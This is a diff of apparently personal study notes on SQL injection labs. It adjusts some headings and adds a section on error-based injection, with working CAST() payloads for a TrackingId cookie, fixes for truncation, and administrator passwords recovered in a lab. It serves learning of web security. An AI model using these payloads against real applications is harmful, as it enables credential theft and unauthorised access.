@@ -360,9 +360,9 @@ Recovered password in this run:
 wjuc497wl6szhbtf0cbf
 ```
 
-## Python Automation
+#### Python Automation
 
-### 1) My Version
+##### 1) My Version
 
 ```python
 import requests
@@ -389,7 +389,7 @@ while switch:
 print(password)
 ```
 
-### 2) My Version (AI Improved)
+##### 2) My Version (AI Improved)
 
 ```python
 import requests
@@ -450,7 +450,7 @@ while True:
 print(f"\n[✓] Final password: {password}")
 ```
 
-### 3) Tutorial Version
+##### 3) Tutorial Version
 
 ```python
 import sys
@@ -495,3 +495,196 @@ def main():
 if __name__ == "__main__":
   main()
 ```
+
+## Extracting Sensitive Data via Verbose SQL Errors
+
+Some applications expose raw database errors when input breaks a query. This is
+often a misconfiguration, and it can reveal exactly how your payload is being
+embedded.
+
+Example after injecting a single quote into an `id` parameter:
+
+```text
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+What this tells you:
+
+- You are inside a single-quoted string.
+- The injection point is in a `WHERE` clause.
+- You likely need to close the quote and comment out the tail to keep syntax
+  valid.
+
+This can turn an otherwise blind issue into a visible one if the app reflects
+database error details back to you.
+
+### Forcing Data into an Error with `CAST()`
+
+You can intentionally trigger a type-conversion error that includes query data.
+`CAST()` is useful for this:
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+If `example_column` is text, many databases throw an error like:
+
+```text
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+Now the value (`Example data`) is leaked in the error message.
+
+Why this matters:
+
+- It gives direct data output when normal page content is blind.
+- It can still work when strict character limits make larger conditional payloads
+  hard to use.
+- It is often faster than boolean extraction when verbose errors are available.
+
+### Lab: Visible Error-Based SQLi (Administrator Password)
+
+Goal: leak the `administrator` password from DB errors, then log in.
+
+#### Quick Approach
+
+1. Confirm quote-breaking behavior in `TrackingId`:
+
+```http
+TrackingId=GA9UUdl1nUvjSjgU'
+```
+
+2. Use a payload that forces string-to-int conversion on the password:
+
+```http
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+3. Read the DB error. If verbose errors are enabled, the failing value is shown:
+
+```text
+ERROR: invalid input syntax for type integer: "<leaked_password>"
+```
+
+4. Use the leaked password to authenticate as `administrator`.
+
+#### Useful Mistakes I Made (and Fixes)
+
+- Mistake: I kept the original tracking ID prefix (`GA9UUdl1nUvjSjgU`) before the injection.
+  Result: payload was too long and got cut mid-query.
+  Seen as: `... FROM users WHE'. Expected char`
+  Fix: remove the original value and start directly with `'` to save space.
+
+- Mistake: I used the longer filter payload first:
+
+```http
+TrackingId=GA9UUdl1nUvjSjgU' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
+```
+
+Result: truncation before `WHERE` finished.
+Fix: start with shorter extraction (`LIMIT 1`) to validate the technique, then refine if needed.
+
+- Mistake: forgetting to neutralize the trailing quote from the original query.
+  Fix: close the string and end with `--` so the rest of the server query is ignored.
+
+#### Compact Payload Options
+
+Primary (short, reliable for technique validation):
+
+```http
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+If multiple rows require iteration:
+
+```http
+' AND 1=CAST((SELECT password FROM users LIMIT 1 OFFSET 0) AS int)--
+```
+
+Then increase `OFFSET` until you leak the target account, or switch to a shorter user filter if the lab allows it.
+
+#### Lab #18 Notes (My Run)
+
+End goal: exploit SQLi in `TrackingId`, leak admin credentials from `users`, and
+log in as `administrator`.
+
+Observed backend pattern after quote testing:
+
+```sql
+select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''
+SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char
+```
+
+Payload progression I used:
+
+```http
+pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--
+' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
+' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
+```
+
+Recovered password in this run:
+
+```text
+fc9v2vqq5gozv1cb0ibj
+```
+
+Quick validation logic:
+
+- If payload is malformed/truncated, you get unterminated string errors.
+- If CAST forces string -> int conversion, the DB error leaks the selected value.
+- Once password is leaked, authenticate as `administrator` to solve the lab.
+
+#### Understanding `Expected char`
+
+This error text is easy to misread. It usually means your payload was truncated,
+which left an unclosed string.
+
+What a string literal means here:
+
+- A string literal is plain text wrapped in single quotes in SQL, like `'admin'`.
+- In this query, the cookie value is placed inside a string literal:
+
+```sql
+WHERE id = '<cookie value>'
+```
+
+- If your injection adds or breaks `'` quotes incorrectly, SQL thinks the text
+  string started but never finished.
+
+Example error:
+
+```text
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'GA9UUdl1nUvjSjgU' AND 1=CAST((SELECT password FROM users WHE'. Expected char
+```
+
+What is happening:
+
+- Input was cut around position 95 (cookie length/validation limit).
+- `WHERE` was truncated to `WHE`.
+- Truncation left a dangling `'`.
+- SQL parser sees a started string literal with no closing quote.
+
+What `Expected char` actually means:
+
+- Not "I need a specific character".
+- It means: "string literal started, but input ended before completion".
+
+Visual:
+
+```text
+Full payload:
+' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
+
+Server received (truncated):
+' AND 1=CAST((SELECT password FROM users WHE'
+```
+
+Fix: shorten the payload to fit the limit.
+
+```http
+'AND CAST((SELECT password FROM users LIMIT 1)AS int)=1--
+```
+
+This removes unnecessary spaces and avoids wasting characters on the original
+tracking ID prefix.
